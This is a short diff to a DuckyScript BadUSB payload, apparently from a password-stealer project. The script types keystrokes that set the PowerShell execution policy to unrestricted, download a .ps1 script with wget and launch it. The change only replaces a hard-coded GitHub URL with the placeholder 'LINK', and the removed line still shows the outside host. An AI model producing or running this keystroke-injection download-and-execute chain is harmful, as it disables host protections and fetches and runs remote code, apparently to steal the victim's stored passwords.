@@ -25,7 +25,7 @@ REM Disable script blocker
 STRING Set-ExecutionPolicy unrestricted -Force
 ENTER
 REM Download ps1 script
-STRING wget https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/ciaoV2.ps1 -OutFile ciaoV2.ps1
+STRING wget LINK -OutFile ciaoV2.ps1
 ENTER
 DELAY 3500
 REM Start ps1 script
